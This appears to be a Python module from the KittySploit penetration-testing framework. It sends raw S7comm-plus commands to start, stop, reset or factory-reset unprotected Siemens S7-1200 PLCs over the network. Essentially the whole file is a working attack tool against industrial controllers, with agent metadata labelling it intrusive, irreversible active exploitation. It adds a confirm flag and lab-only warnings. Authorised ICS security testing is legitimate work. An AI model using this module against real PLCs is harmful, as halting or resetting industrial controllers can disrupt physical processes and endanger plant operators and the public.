#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Siemens S7-1200 PLC control.

Uses raw S7comm-plus style packets to start, stop, or reset unprotected S7-1200 CPUs.
"""

from __future__ import annotations

from kittysploit import *
from lib.protocols.ics.constants import ICS_PROTOCOL_PORTS
from lib.protocols.ics.ics_scanner_client import Ics_scanner_client
from lib.protocols.ics.s7_1200_client import (
    DEFAULT_HOST_SESSION,
    DEFAULT_SESSION,
    S7_1200Client,
    S7_1200Command,
    is_s7_port_open,
)


class Module(Auxiliary, Ics_scanner_client):
    __info__ = {
        "name": "Siemens S7-1200 PLC control",
        "description": (
            "Sends raw S7comm-plus style commands to start, stop, reset, or factory-reset "
            "an unprotected Siemens S7-1200 PLC CPU."
        ),
        "author": ["wenzhe zhu", "KittySploit Team"],
        "platform": Platform.OTHER,
        "tags": ["ics", "siemens", "s7comm", "s7-1200", "plc", "ot"],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["risk_signals"],
        },
    }

    port = OptPort(ICS_PROTOCOL_PORTS["s7comm"], "S7comm port", True)
    command = OptChoice(
        "stop",
        "PLC command",
        True,
        choices=["start", "stop", "reset", "reset_ip"],
    )
    session = OptString(DEFAULT_SESSION, "Static session token embedded in setup packet", False, advanced=True)
    host_session = OptString(
        DEFAULT_HOST_SESSION,
        "Workstation name embedded in setup packet",
        False,
        advanced=True,
    )
    pause = OptFloat(0.5, "Delay between chained stop/reset commands", False, advanced=True)
    confirm = OptBool(False, "Confirm intentional PLC state change", True)

    def _resolve_command(self) -> S7_1200Command:
        action = str(self.command or "stop").strip().lower()
        mapping = {
            "start": S7_1200Command.START,
            "stop": S7_1200Command.STOP,
            "reset": S7_1200Command.RESET,
            "reset_ip": S7_1200Command.RESET_AND_IP,
        }
        if action not in mapping:
            raise ValueError(f"unsupported command: {action}")
        return mapping[action]

    def check(self):
        host = self._host()
        if not host:
            return {"vulnerable": False, "reason": "target not set", "confidence": "low"}
        if not bool(self.confirm):
            return {
                "vulnerable": False,
                "reason": "set confirm=true to acknowledge PLC control",
                "confidence": "high",
            }
        if not is_s7_port_open(host, self._port(), self._timeout()):
            return {"vulnerable": False, "reason": f"TCP {self._port()} closed", "confidence": "high"}
        return {
            "vulnerable": True,
            "reason": "S7comm port open — unprotected S7-1200 control may be possible",
            "confidence": "low",
        }

    def run(self):
        host = self._host()
        if not host:
            print_error("Target is required")
            return False
        if not bool(self.confirm):
            print_error("Refusing to control PLC without confirm=true")
            return False

        try:
            cmd = self._resolve_command()
        except ValueError as exc:
            print_error(str(exc))
            return False

        labels = {
            S7_1200Command.START: "START",
            S7_1200Command.STOP: "STOP",
            S7_1200Command.RESET: "RESET",
            S7_1200Command.RESET_AND_IP: "RESET + IP factory reset",
        }
        action = labels[cmd]

        print_warning(f"PLC {action} is destructive — authorized OT lab use only")
        if not is_s7_port_open(host, self._port(), self._timeout()):
            print_error(f"Target {host}:{self._port()} is not reachable")
            return False

        print_success("Target S7comm port is open")
        print_status(f"Sending S7-1200 {action} command to {host}:{self._port()}...")

        client = S7_1200Client(
            host,
            self._port(),
            self._timeout(),
            str(self.session or DEFAULT_SESSION),
            str(self.host_session or DEFAULT_HOST_SESSION),
        )
        try:
            client.run_command(cmd, float(self.pause or 0.5))
        except (OSError, RuntimeError, ValueError) as exc:
            print_error(f"S7-1200 control failed: {exc}")
            return False

        print_success(f"S7-1200 {action} command sent to {host}:{self._port()}")
        if cmd in (S7_1200Command.RESET, S7_1200Command.RESET_AND_IP):
            print_warning("Verify PLC state on-site — reset commands are not reversible remotely")
        return True
